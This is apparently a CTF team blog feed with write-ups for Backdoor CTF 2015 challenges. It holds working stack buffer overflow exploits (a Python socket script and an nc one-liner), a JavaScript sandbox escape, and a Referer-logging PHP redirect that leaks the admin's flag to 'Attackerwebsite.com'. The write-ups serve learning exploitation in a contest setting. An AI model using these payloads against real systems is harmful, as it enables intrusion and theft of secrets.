Recently, Lua started to annoy Fawkes. To this, Fawkes, challenged Lua to a battle of wits. Fawkes promised to reward Lua, only if she manages to transition to a non-reachable state in the FSA he implemented. The replication can be accessed here.</p></blockquote>

<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>$ file forgot
</span><span class='line'>forgot: ELF 32-bit LSB executable, Intel 80386, version 1 (SYSV), dynamically linked (uses shared libs), for GNU/Linux 2.6.24, BuildID[sha1]=35930a2d9b048236694e9611073b759e1c88b8c4, stripped</span></code></pre></td></tr></table></div></figure>




<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
<span class='line-number'>8</span>
<span class='line-number'>9</span>
<span class='line-number'>10</span>
<span class='line-number'>11</span>
<span class='line-number'>12</span>
<span class='line-number'>13</span>
<span class='line-number'>14</span>
<span class='line-number'>15</span>
<span class='line-number'>16</span>
<span class='line-number'>17</span>
<span class='line-number'>18</span>
<span class='line-number'>19</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>$ ./forgot 
</span><span class='line'>What is your name?
</span><span class='line'>&gt; AAAAAAAAA
</span><span class='line'>
</span><span class='line'>Hi AAAAAAAAA
</span><span class='line'>
</span><span class='line'>
</span><span class='line'>                        Finite-State Automaton
</span><span class='line'>
</span><span class='line'>I have implemented a robust FSA to validate email addresses
</span><span class='line'>Throw a string at me and I will let you know if it is a valid email address
</span><span class='line'>
</span><span class='line'>                                Cheers!
</span><span class='line'>
</span><span class='line'>I should give you a pointer perhaps. Here: 8048654
</span><span class='line'>
</span><span class='line'>Enter the string to be validate
</span><span class='line'>&gt; AAAAAAAAAAAAAAAAAA
</span><span class='line'>Dude, you seriously think this is going to work. Where are the fancy @ and [dot], huh?</span></code></pre></td></tr></table></div></figure>


<p>without loosing time opening the binary into IDA shows us several functions but the General function to this functionality is <code>0x08047AA</code>. lets see the psuedo-code :</p>

<!--more-->


<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
<span class='line-number'>8</span>
<span class='line-number'>9</span>
<span class='line-number'>10</span>
<span class='line-number'>11</span>
<span class='line-number'>12</span>
<span class='line-number'>13</span>
<span class='line-number'>14</span>
<span class='line-number'>15</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>...
</span><span class='line'>  puts("What is your name?");
</span><span class='line'>  printf("&gt; ");
</span><span class='line'>  fflush(stdout);
</span><span class='line'>  fgets((char *)&v19, 32, stdin);
</span><span class='line'>  sub_80485DD(&v19);
</span><span class='line'>  fflush(stdout);
</span><span class='line'>  printf("I should give you a pointer perhaps. Here: %x\n\n", sub_8048654);
</span><span class='line'>  fflush(stdout);
</span><span class='line'>  puts("Enter the string to be validate");
</span><span class='line'>  printf("&gt; ");
</span><span class='line'>  fflush(stdout);
</span><span class='line'>  __isoc99_scanf("%s", &v8);
</span><span class='line'>  for ( i = 0; ; ++i )
</span><span class='line'> ...</span></code></pre></td></tr></table></div></figure>


<p>This is the interesting part since we have control on inputs. <code>v19</code> is a 32 char buffer so no vulnerabilty is there. but what about <code>__isoc99_scanf("%s", &amp;v8);</code> ? obviously using <em>scanf</em> in such a manner is exteremly dangerous. <code>v8</code> also is a 32 char buffer. so it is also another stack buffer overflow like <code>ECHO</code>. lets check this condition :</p>

<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
<span class='line-number'>8</span>
<span class='line-number'>9</span>
<span class='line-number'>10</span>
<span class='line-number'>11</span>
<span class='line-number'>12</span>
<span class='line-number'>13</span>
<span class='line-number'>14</span>
<span class='line-number'>15</span>
<span class='line-number'>16</span>
<span class='line-number'>17</span>
<span class='line-number'>18</span>
<span class='line-number'>19</span>
<span class='line-number'>20</span>
<span class='line-number'>21</span>
<span class='line-number'>22</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>$ python -c 'print "GeeksSpeak\n"+"A"*40+"\n"' &gt; forgot.test
</span><span class='line'>hamidx9@KernelsCallMe:~/ctf/backdoor/public/FORGOT$ cat forgot.test 
</span><span class='line'>GeeksSpeak
</span><span class='line'>AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
</span><span class='line'>
</span><span class='line'>hamidx9@KernelsCallMe:~/ctf/backdoor/public/FORGOT$ ./forgot &lt; forgot.test 
</span><span class='line'>What is your name?
</span><span class='line'>&gt; 
</span><span class='line'>Hi GeeksSpeak
</span><span class='line'>
</span><span class='line'>
</span><span class='line'>                        Finite-State Automaton
</span><span class='line'>
</span><span class='line'>I have implemented a robust FSA to validate email addresses
</span><span class='line'>Throw a string at me and I will let you know if it is a valid email address
</span><span class='line'>
</span><span class='line'>                                Cheers!
</span><span class='line'>
</span><span class='line'>I should give you a pointer perhaps. Here: 8048654
</span><span class='line'>
</span><span class='line'>Enter the string to be validate
</span><span class='line'>Segmentation fault (core dumped)
</span></code></pre></td></tr></table></div></figure>


<p>and <code>gdb</code> proves this too. but how should i read the flag? do we need ROP? or something simillar? i started dumping strings in IDA and located these:</p>

<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>.rodata:08048D9F 00000007 C ./flag
</span><span class='line'>.rodata:08048DA6 00000007 C cat %s</span></code></pre></td></tr></table></div></figure>


<p>these strings had been used in <code>0x080486CC</code> and finding a call system proves that like ECHO we should just using this function as RET.</p>

<p>by using this piece of code we have:</p>

<figure class='code'><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
<span class='line-number'>8</span>
<span class='line-number'>9</span>
<span class='line-number'>10</span>
<span class='line-number'>11</span>
<span class='line-number'>12</span>
<span class='line-number'>13</span>
<span class='line-number'>14</span>
<span class='line-number'>15</span>
<span class='line-number'>16</span>
<span class='line-number'>17</span>
<span class='line-number'>18</span>
<span class='line-number'>19</span>
<span class='line-number'>20</span>
<span class='line-number'>21</span>
<span class='line-number'>22</span>
<span class='line-number'>23</span>
<span class='line-number'>24</span>
<span class='line-number'>25</span>
<span class='line-number'>26</span>
<span class='line-number'>27</span>
<span class='line-number'>28</span>
<span class='line-number'>29</span>
<span class='line-number'>30</span>
<span class='line-number'>31</span>
<span class='line-number'>32</span>
</pre></td><td class='code'><pre><code class='python'><span class='line'><span class="c">#!/usr/bin/python</span>
</span><span class='line'><span class="kn">import</span> <span class="nn">struct</span>
</span><span class='line'><span class="kn">import</span> <span class="nn">socket</span>
</span><span class='line'><span class="kn">import</span> <span class="nn">telnetlib</span>
</span><span class='line'>
</span><span class='line'><span class="k">def</span> <span class="nf">readuntil</span><span class="p">(</span><span class="n">f</span><span class="p">,</span> <span class="n">delim</span><span class="o">=</span><span class="s">&#39;&gt; &#39;</span><span class="p">):</span>
</span><span class='line'>    <span class="n">data</span> <span class="o">=</span> <span class="s">&#39;&#39;</span>
</span><span class='line'>    <span class="k">while</span> <span class="ow">not</span> <span class="n">data</span><span class="o">.</span><span class="n">endswith</span><span class="p">(</span><span class="n">delim</span><span class="p">):</span>
</span><span class='line'>        <span class="n">c</span> <span class="o">=</span> <span class="n">f</span><span class="o">.</span><span class="n">read</span><span class="p">(</span><span class="mi">1</span><span class="p">)</span>
</span><span class='line'>        <span class="k">assert</span> <span class="nb">len</span><span class="p">(</span><span class="n">c</span><span class="p">)</span> <span class="o">&gt;</span> <span class="mi">0</span>
</span><span class='line'>        <span class="n">data</span> <span class="o">+=</span> <span class="n">c</span>
</span><span class='line'>    <span class="k">return</span> <span class="n">data</span>
</span><span class='line'>
</span><span class='line'><span class="k">def</span> <span class="nf">p</span><span class="p">(</span><span class="n">v</span><span class="p">):</span>
</span><span class='line'>    <span class="k">return</span> <span class="n">struct</span><span class="o">.</span><span class="n">pack</span><span class="p">(</span><span class="s">&#39;&lt;I&#39;</span><span class="p">,</span> <span class="n">v</span><span class="p">)</span>
</span><span class='line'>
</span><span class='line'><span class="k">def</span> <span class="nf">u</span><span class="p">(</span><span class="n">v</span><span class="p">):</span>
</span><span class='line'>    <span class="k">return</span> <span class="n">struct</span><span class="o">.</span><span class="n">unpack</span><span class="p">(</span><span class="s">&#39;&lt;I&#39;</span><span class="p">,</span> <span class="n">v</span><span class="p">)[</span><span class="mi">0</span><span class="p">]</span>
</span><span class='line'>
</span><span class='line'>
</span><span class='line'><span class="n">s</span> <span class="o">=</span> <span class="n">socket</span><span class="o">.</span><span class="n">socket</span><span class="p">(</span><span class="n">socket</span><span class="o">.</span><span class="n">AF_INET</span><span class="p">,</span> <span class="n">socket</span><span class="o">.</span><span class="n">SOCK_STREAM</span><span class="p">)</span>
</span><span class='line'><span class="n">s</span><span class="o">.</span><span class="n">connect</span><span class="p">((</span><span class="s">&#39;hack.bckdr.in&#39;</span><span class="p">,</span> <span class="mi">8009</span><span class="p">))</span>
</span><span class='line'><span class="n">f</span> <span class="o">=</span> <span class="n">s</span><span class="o">.</span><span class="n">makefile</span><span class="p">(</span><span class="s">&#39;rw&#39;</span><span class="p">,</span> <span class="n">bufsize</span><span class="o">=</span><span class="mi">0</span><span class="p">)</span>
</span><span class='line'>
</span><span class='line'><span class="n">readuntil</span><span class="p">(</span><span class="n">f</span><span class="p">)</span>
</span><span class='line'><span class="n">f</span><span class="o">.</span><span class="n">write</span><span class="p">(</span><span class="s">&quot;A</span><span class="se">\n</span><span class="s">&quot;</span><span class="p">)</span>
</span><span class='line'><span class="n">readuntil</span><span class="p">(</span><span class="n">f</span><span class="p">)</span>
</span><span class='line'><span class="n">f</span><span class="o">.</span><span class="n">write</span><span class="p">(</span><span class="s">&quot;A&quot;</span><span class="o">*</span><span class="mi">32</span><span class="o">+</span><span class="n">p</span><span class="p">(</span><span class="mh">0x80486CC</span><span class="p">)</span><span class="o">+</span><span class="s">&quot;</span><span class="se">\n</span><span class="s">&quot;</span><span class="p">)</span>
</span><span class='line'>
</span><span class='line'><span class="n">t</span> <span class="o">=</span> <span class="n">telnetlib</span><span class="o">.</span><span class="n">Telnet</span><span class="p">()</span>
</span><span class='line'><span class="n">t</span><span class="o">.</span><span class="n">sock</span> <span class="o">=</span> <span class="n">s</span>
</span><span class='line'><span class="n">t</span><span class="o">.</span><span class="n">interact</span><span class="p">()</span>
</span></code></pre></td></tr></table></div></figure>




<figure class='code'><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
</pre></td><td class='code'><pre><code class='python'><span class='line'><span class="err">$</span> <span class="n">python</span> <span class="n">sol</span><span class="o">.</span><span class="n">py</span>
</span><span class='line'><span class="p">[</span><span class="n">redacted</span><span class="p">]</span>
</span><span class='line'><span class="o">***</span> <span class="n">Connection</span> <span class="n">closed</span> <span class="n">by</span> <span class="n">remote</span> <span class="n">host</span> <span class="o">***</span>
</span></code></pre></td></tr></table></div></figure>


<p>We&rsquo;ve got the flag. 200pts.</p>

<p>HAMIDx9</p>
]]></content>
  </entry>
  
  <entry>
    <title type="html"><![CDATA[Backdoor CTF 2015 - CONCEALED Writeup]]></title>
    <link href="http://geeksspeak.github.io/blog/2015/04/03/backdoor-ctf-2015-concealed-writeup/"/>
    <updated>2015-04-03T02:33:31+04:30</updated>
    <id>http://geeksspeak.github.io/blog/2015/04/03/backdoor-ctf-2015-concealed-writeup</id>
    <content type="html"><![CDATA[<p><strong>Backdoor 2015 CONCEALED Writeup</strong><br/>
<strong>Point = 150</strong><br/>
<strong>Category = Exploit</strong></p>

<blockquote><p>All paths have been concealed. Get the hidden flag: nc hack.bckdr.in 8005. Submit sha-256 of the flag</p></blockquote>

<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
<span class='line-number'>8</span>
<span class='line-number'>9</span>
<span class='line-number'>10</span>
<span class='line-number'>11</span>
<span class='line-number'>12</span>
<span class='line-number'>13</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>$ nc hack.bckdr.in 8005
</span><span class='line'>######################################
</span><span class='line'>####           CONCEAL            ####
</span><span class='line'>######################################
</span><span class='line'>
</span><span class='line'>Welcome to CONCEAL
</span><span class='line'>You have access to object named sandboxed and its functions 
</span><span class='line'>Rest everything is sandboxed, don't be a jerk and break something
</span><span class='line'>Wrap your code in a function and return what you want as output
</span><span class='line'>Flag is hidden somewhere in the code. 
</span><span class='line'>Get the flag :D!
</span><span class='line'>
</span><span class='line'>home@jail:$ 
</span></code></pre></td></tr></table></div></figure>


<p>First of all as banner says we should use all our payload as a function like :</p>

<!--more-->


<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>home@jail:$ function exploit() { return "GeeksSpeak"; }
</span><span class='line'>GeeksSpeak
</span><span class='line'>home@jail:$ </span></code></pre></td></tr></table></div></figure>


<p>After some diging into the the challenge, trying to break the jail and so on, reading banner carefully indicates that the flag is in the code so i should read codes but how?</p>

<p>In javascript we can use arguments.caller to see which function calls our current function so i made up an example and tested it:</p>

<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
<span class='line-number'>8</span>
<span class='line-number'>9</span>
<span class='line-number'>10</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>home@jail:$ function exploit() { return exploit.caller.toString(); }
</span><span class='line'>function () {return (function exploit() { return exploit.caller.toString(); })()}
</span><span class='line'>home@jail:$ function exploit() { return (exploit.caller).caller.toString(); }
</span><span class='line'>function () {
</span><span class='line'>        if (!(this instanceof Script)) {
</span><span class='line'>          throw new TypeError('invalid call to ' + f);
</span><span class='line'>        }
</span><span class='line'>        return ns[f].apply(ns, arguments);
</span><span class='line'>      }
</span><span class='line'>home@jail:$ 
</span></code></pre></td></tr></table></div></figure>


<p>this proved my idea, so i used caller repeatedly and finally got the flag as bellow:</p>

<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
<span class='line-number'>8</span>
<span class='line-number'>9</span>
<span class='line-number'>10</span>
<span class='line-number'>11</span>
<span class='line-number'>12</span>
<span class='line-number'>13</span>
<span class='line-number'>14</span>
<span class='line-number'>15</span>
<span class='line-number'>16</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>home@jail:$ function exploit() { return ((((((((exploit.caller).caller).caller).caller).caller).caller).caller).caller).caller.toString(); }
</span><span class='line'>function (err, line) {
</span><span class='line'>
</span><span class='line'>    // flag : [redacted]
</span><span class='line'>
</span><span class='line'>    if (err && wait === false) {
</span><span class='line'>      return callback(err);
</span><span class='line'>    }
</span><span class='line'>
</span><span class='line'>    var against = {},
</span><span class='line'>        numericInput,
</span><span class='line'>        isValid;
</span><span class='line'>
</span><span class='line'>    if (line !== '') {
</span><span class='line'>      if (schema.properties[propName]) 
</span><span class='line'>      [..stripped..]</span></code></pre></td></tr></table></div></figure>


<p>and sha256 of the <code>[redacted]</code> gives us another 150pts.</p>

<p>HAMIDx9</p>
]]></content>
  </entry>
  
  <entry>
    <title type="html"><![CDATA[Backdoor CTF 2015 - ECHO Writeup]]></title>
    <link href="http://geeksspeak.github.io/blog/2015/04/03/backdoor-ctf-2015-echo-writeup/"/>
    <updated>2015-04-03T02:12:58+04:30</updated>
    <id>http://geeksspeak.github.io/blog/2015/04/03/backdoor-ctf-2015-echo-writeup</id>
    <content type="html"><![CDATA[<p><strong>Backdoor 2015 ECHO Writeup</strong><br/>
<strong>Point = 100</strong><br/>
<strong>Category = Binary</strong></p>

<blockquote><p>Little Suzie started learning C. She created a simple program that echo&rsquo;s back whatever you input. Here is the binary file. The vampire came across this service on the internet. nc hack.bckdr.in 8002. Reports say he found a flag. See if you can get it.</p></blockquote>

<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>$ file echo
</span><span class='line'>echo: ELF 32-bit LSB executable, Intel 80386, version 1 (SYSV), dynamically linked (uses shared libs), for GNU/Linux 2.6.24, BuildID[sha1]=15ec07e5664a13e94069c818141cc9f70591d0f0, not stripped</span></code></pre></td></tr></table></div></figure>


<p>As it seems we have a 32bit binary as a ECHO server. the output confirms this:</p>

<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>$ nc hack.bckdr.in 8002
</span><span class='line'>GeeksSpeak
</span><span class='line'>ECHO: GeeksSpeak</span></code></pre></td></tr></table></div></figure>


<p>opening the binary in IDA shows us that the main function calls test() as we can see the psuedo-code below :</p>

<!-- more -->


<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>int test()
</span><span class='line'>{
</span><span class='line'>  char s; // [sp+1Eh] [bp-3Ah]@1
</span><span class='line'>
</span><span class='line'>  gets(&s);
</span><span class='line'>  return fprintf(_bss_start, "ECHO: %s\n", &s);
</span><span class='line'>}
</span></code></pre></td></tr></table></div></figure>


<p>It&rsquo;s an obvious Stack buffer overflow. without loosing time i loaded it into <em>gdb</em> and used  cyclic pattern to find the offset:</p>

<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
<span class='line-number'>8</span>
<span class='line-number'>9</span>
<span class='line-number'>10</span>
<span class='line-number'>11</span>
<span class='line-number'>12</span>
<span class='line-number'>13</span>
<span class='line-number'>14</span>
<span class='line-number'>15</span>
<span class='line-number'>16</span>
<span class='line-number'>17</span>
<span class='line-number'>18</span>
<span class='line-number'>19</span>
<span class='line-number'>20</span>
<span class='line-number'>21</span>
<span class='line-number'>22</span>
<span class='line-number'>23</span>
<span class='line-number'>24</span>
<span class='line-number'>25</span>
<span class='line-number'>26</span>
<span class='line-number'>27</span>
<span class='line-number'>28</span>
<span class='line-number'>29</span>
<span class='line-number'>30</span>
<span class='line-number'>31</span>
<span class='line-number'>32</span>
<span class='line-number'>33</span>
<span class='line-number'>34</span>
<span class='line-number'>35</span>
<span class='line-number'>36</span>
<span class='line-number'>37</span>
<span class='line-number'>38</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>$ gdb ./echo -q
</span><span class='line'>Reading symbols from ./echo...(no debugging symbols found)...done.
</span><span class='line'>gdb-peda$ pattern_create 100
</span><span class='line'>'AAA%AAsAABAA$AAnAACAA-AA(AADAA;AA)AAEAAaAA0AAFAAbAA1AAGAAcAA2AAHAAdAA3AAIAAeAA4AAJAAfAA5AAKAAgAA6AAL'
</span><span class='line'>gdb-peda$ shell echo 'AAA%AAsAABAA$AAnAACAA-AA(AADAA;AA)AAEAAaAA0AAFAAbAA1AAGAAcAA2AAHAAdAA3AAIAAeAA4AAJAAfAA5AAKAAgAA6AAL' &gt; echo.test
</span><span class='line'>gdb-peda$ r &lt; echo.test 
</span><span class='line'>Starting program: /home/hamidx9/ctf/backdoor/echo &lt; echo.test
</span><span class='line'>ECHO: AAA%AAsAABAA$AAnAACAA-AA(AADAA;AA)AAEAAaAA0AAFAAbAA1AAGAAcAA2AAHAAdAA3AAIAAeAA4AAJAAfAA5AAKAAgAA6AAL
</span><span class='line'>
</span><span class='line'>Program received signal SIGSEGV, Segmentation fault.
</span><span class='line'>[-----------------------------------------------------------------------------------------------------------registers-----------------------------------------------------------------------------------------------------------]
</span><span class='line'>EAX: 0x6b (b'k')
</span><span class='line'>EBX: 0xf7fae000 --&gt; 0x1a8da8 
</span><span class='line'>ECX: 0x6b (b'k')
</span><span class='line'>EDX: 0xf7faf86c --&gt; 0x0 
</span><span class='line'>ESI: 0x0 
</span><span class='line'>EDI: 0x0 
</span><span class='line'>EBP: 0x41324141 (b'AA2A')
</span><span class='line'>ESP: 0xffffcdd0 ("dAA3AAIAAeAA4AA"...)
</span><span class='line'>EIP: 0x41414841 (b'AHAA')
</span><span class='line'>[-------------------------------------------------------------------------------------------------------------code--------------------------------------------------------------------------------------------------------------]
</span><span class='line'>Invalid $PC address: 0x41414841
</span><span class='line'>[-------------------------------------------------------------------------------------------------------------stack-------------------------------------------------------------------------------------------------------------]
</span><span class='line'>00:0000| esp 0xffffcdd0 ("dAA3AAIAAeAA4AA"...)
</span><span class='line'>01:0004|     0xffffcdd4 ("AAIAAeAA4AAJAAf"...)
</span><span class='line'>02:0008|     0xffffcdd8 ("AeAA4AAJAAfAA5A"...)
</span><span class='line'>03:0012|     0xffffcddc ("4AAJAAfAA5AAKAA"...)
</span><span class='line'>04:0016|     0xffffcde0 ("AAfAA5AAKAAgAA6"...)
</span><span class='line'>05:0020|     0xffffcde4 ("A5AAKAAgAA6AAL")
</span><span class='line'>06:0024|     0xffffcde8 ("KAAgAA6AAL")
</span><span class='line'>07:0028|     0xffffcdec ("AA6AAL")
</span><span class='line'>[-------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------]
</span><span class='line'>Legend: stack, code, data, heap, rodata, value
</span><span class='line'>Stopped reason: SIGSEGV
</span><span class='line'>0x41414841 in ?? ()
</span><span class='line'>gdb-peda$ pattern_offset 'AHAA'
</span><span class='line'>AHAA found at offset: 62
</span><span class='line'>gdb-peda$ 
</span></code></pre></td></tr></table></div></figure>


<p>So the <code>offset = 62</code>. but where should we jump? IDA shows us there is another function named <code>sample</code> which open <code>flag.txt</code> and print its content. All have to do is to call <code>sample</code> with address = <em>0x0804854d</em>.</p>

<p>Final payload looks like below :</p>

<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>[A*62] + [0x0804854d in little endian]</span></code></pre></td></tr></table></div></figure>


<p>And finally we&rsquo;ve got the flag:</p>

<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>$ python -c 'import struct; q=lambda x: struct.pack("&lt;I", x); print "A"*62+q(0x0804854d)' | nc hack.bckdr.in 8002
</span><span class='line'>ECHO: AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAM�
</span><span class='line'>[redacted]</span></code></pre></td></tr></table></div></figure>


<p>And another 100 pt.</p>

<p>HAMIDx9</p>
]]></content>
  </entry>
  
  <entry>
    <title type="html"><![CDATA[Backdoor CTF 2015 - Medusa Writeup]]></title>
    <link href="http://geeksspeak.github.io/blog/2015/04/03/backdoor-ctf-2015-medusa-writeup/"/>
    <updated>2015-04-03T01:06:09+04:30</updated>
    <id>http://geeksspeak.github.io/blog/2015/04/03/backdoor-ctf-2015-medusa-writeup</id>
    <content type="html"><![CDATA[<p><strong>Backdoor2015 Medusa Writeup</strong><br/>
<strong>Point = 100</strong><br/>
<strong>Category = Web</strong><br/>
<strong>Description : </strong></p>

<blockquote><p>The html page you create will be visited by the backdoor admin with the flag.
You can enter a fake flag to simulate the challenge.</p>

<p>Get the flag at <a href="http://hack.bckdr.in/MEDUSA/">http://hack.bckdr.in/MEDUSA/</a></p></blockquote>

<p>After We open the link that is provided in description we are welcomed with a form.you can send message with html code and after that admin will visit your page with the flag.</p>

<!-- more -->


<p><img src="http://up.ashiyane.org/images/nxcfynwxymxjqi2v4u7.png" title="Medusa Form" alt="alt text" /></p>

<p>Backdoor CTF admin add a hint and mention that they sent flag as post request</p>

<p>this is sample request that admin sent :</p>

<p><a href="http://hack.bckdr.in/MEDUSA/view.php?id=ID&amp;flag=FLAG">http://hack.bckdr.in/MEDUSA/view.php?id=ID&amp;flag=FLAG</a></p>

<p>when you sent the message Medusa website create id for you.
you can visit your message with this id ( same as admin :D )</p>

<p><img src="http://up.ashiyane.org/images/wu0fm2e5n6shme48fj58.png" title="Message Read" alt="alt text" /></p>

<p>we test different method to get the flag value from post request with PHP or JavaScript in our page but we see error or blank page.</p>

<blockquote><p>after some investigation our team found answer !!!</p></blockquote>

<p>we can redirect admin to another page and get the flag</p>

<p>but if they sent request as post cant log the value in second page.so thinking to Referer attribute in the header.</p>

<p>write some code to get and save the Referer in the text file when admin redirect to our PHP page :
Server.php</p>

<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>&lt;?php
</span><span class='line'>$ref = $_SERVER['HTTP_REFERER'];
</span><span class='line'>file_put_contents("flag.txt",$ref);
</span><span class='line'>?&gt;</span></code></pre></td></tr></table></div></figure>


<blockquote><p>and sent this code as our page to Medusa form :</p></blockquote>

<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>---
</span><span class='line'>location: http://Attackerwebsite.com/server.php
</span><span class='line'>---
</span><span class='line'>Can you get the **flag**?</span></code></pre></td></tr></table></div></figure>


<p>but after admin visit the link flag.txt is empty !!!</p>

<p>no Referer sent to PHP page&hellip;</p>

<p>we test several time ( for this challenge or local tests ) and same result,no Referer save in flag.txt</p>

<p>after some research we found out with this kind of header redirection we cant get Referer and we should change that.</p>

<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>---
</span><span class='line'>Refresh: 0; url=http://Attackerwebsite.com/server.php
</span><span class='line'>---
</span><span class='line'>Can you get the **flag**?
</span></code></pre></td></tr></table></div></figure>


<p>and guess what?</p>

<blockquote><p>we have Referer Link in flag.txt :D</p></blockquote>

<p><a href="http://hack.bckdr.in/MEDUSA/view.php?flag=[redacted]&amp;id=d61d051c6e741595491c">Referer Link With Flag!</a></p>

<p>and now you have 100 point :D</p>

<p>WriteUp By Fr0nk</p>
]]></content>
  </entry>
  
  <entry>
    <title type="html"><![CDATA[Backdoor CTF 2015 - Noname Writeup]]></title>
    <link href="http://geeksspeak.github.io/blog/2015/04/03/backdoor-ctf-2015-noname-writeup/"/>
    <updated>2015-04-03T00:42:36+04:30</updated>
    <id>http://geeksspeak.github.io/blog/2015/04/03/backdoor-ctf-2015-noname-writeup</id>
    <content type="html"><![CDATA[<p><strong>Backdoor2015 NONAME Writeup</strong><br/>
<strong>Point = 200</strong><br/>
<strong>Category = Exploit</strong><br/>
<strong>Description : </strong></p>

<blockquote><p>Intrestingly enough, even though it was not expected, Chintu found a cool website to play with, though he can&rsquo;t get the flag. Can you? Visit <a href="https://agile-garden-1672.herokuapp.com/">this</a>. Submit the SHA-256 hash of the flag obtained.</p>

<p>Welcome to Noname! You can see an intrepreter above
Get admin&rsquo;s flag and admin&rsquo;s secret. Remember admin is one of the people
Submit sha-256 of secret and flag joined
Get admin&rsquo;s flag and admin&rsquo;s secret. Remember admin is one of the people
Submit sha-256 of secret and flag joined</p></blockquote>

<p>We could see  see an intrepreter like this :</p>

<!-- more -->


<p><img src="http://up.ashiyane.org/images/7f689wqyxbbwiaxbwl.png" alt="enter image description here" />
so first for testing script give &ldquo;1&rdquo; as input it will retrun &ldquo;1&rdquo; again ..
lets check whats going on in browser run firebug and check :</p>

<p><img src="http://up.ashiyane.org/images/2fmqsv03ko2qatsw10tq.png" alt="enter image description here" /></p>

<p>Its using JSON with eval.json at this <a href="https://agile-garden-1672.herokuapp.com/eval.json?expr=1">LINK</a> .
Lets see whats happen if we execute our codes directly :
<a href="https://agile-garden-1672.herokuapp.com/eval.json?expr=*">https://agile-garden-1672.herokuapp.com/eval.json?expr=*</a>
And the response :</p>

